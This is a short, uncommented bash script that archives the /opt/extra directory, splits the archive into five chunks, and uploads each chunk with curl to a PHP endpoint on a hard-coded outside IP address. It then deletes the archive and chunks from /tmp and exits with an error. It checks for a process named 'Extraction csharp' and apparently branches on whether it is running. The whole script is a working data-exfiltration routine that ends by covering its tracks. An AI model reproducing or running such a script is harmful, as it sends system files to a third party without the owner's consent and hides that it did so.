#! /bin/bash

numprocesses=$(ps axuf | grep "Extraction csharp " | wc -l)
if [[ $numprocesses -gt 1 ]] ; then

echo "CEE."


else
echo "JAVA"
tar czf /tmp/jav-extra.tar.gz /opt/extra
md5sum /tmp/jav-*.tar.gz
cd /tmp/
df -h
split -n 5 jav-extra.tar.gz

curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/xaa" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-ex-xaa" 
curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/xab" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-ex-xab" 
curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/xac" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-ex-xac" 
curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/xad" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-ex-xad" 
curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/xae" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-ex-xae" 
ls -liah /tmp/

rm -rf /tmp/jav-*.tar.gz
rm -rf /tmp/xa{a,b,c,d,e}

fi

exit -1
